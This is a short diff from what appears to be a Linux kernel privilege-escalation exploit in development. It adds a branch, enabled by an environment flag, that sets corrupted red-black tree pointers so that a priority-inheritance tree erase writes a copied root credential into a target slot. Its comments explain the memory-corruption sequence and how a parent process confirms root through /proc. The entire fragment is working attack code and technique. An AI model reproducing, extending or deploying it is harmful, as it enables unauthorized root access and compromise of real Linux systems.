@@ -1027,7 +1027,23 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   (active_offsets && active_offsets->off_init_task)
                       ? (uint64_t)active_offsets->off_init_task
                       : (uint64_t)INIT_TASK_OFF;
-              if (env_flag("MODE4_DUALWRITE", 0)) {
+              if (env_flag("MODE4_CRED_PI", 0)) {
+                /* PI-STORE ROOT FIRE: main tree all-zero (fire-6 proven
+                 * pure-unlink shape); the pi-tree erase alone stores:
+                 *   *slot = cred_copy (Image-verbatim root cred, clean
+                 *            aligned pointer)
+                 * pi rebalance: sibling = *(cc+8)=0 -> NULL case; up-walk
+                 * cc -> usage(=&zeroed slot) -> *(Z)=0 -> terminates.
+                 * change_child corrupts only cc+8 (our page).
+                 * The parent verifies via /proc/<child>/status — the
+                 * child makes ZERO syscalls (security field unknown). */
+                tree_pc = 0;
+                tree_r = 0;
+                tree_l = 0;
+                pi_parent = val;
+                pi_right = 0;
+                pi_left = ztgt;
+              } else if (env_flag("MODE4_DUALWRITE", 0)) {
                 /* 09-13 canary proof: 0x780 direct stores NEVER land
                  * (vendor-protected subjective cred) but the erase's
                  * SECOND store (__rb_change_child writes the child
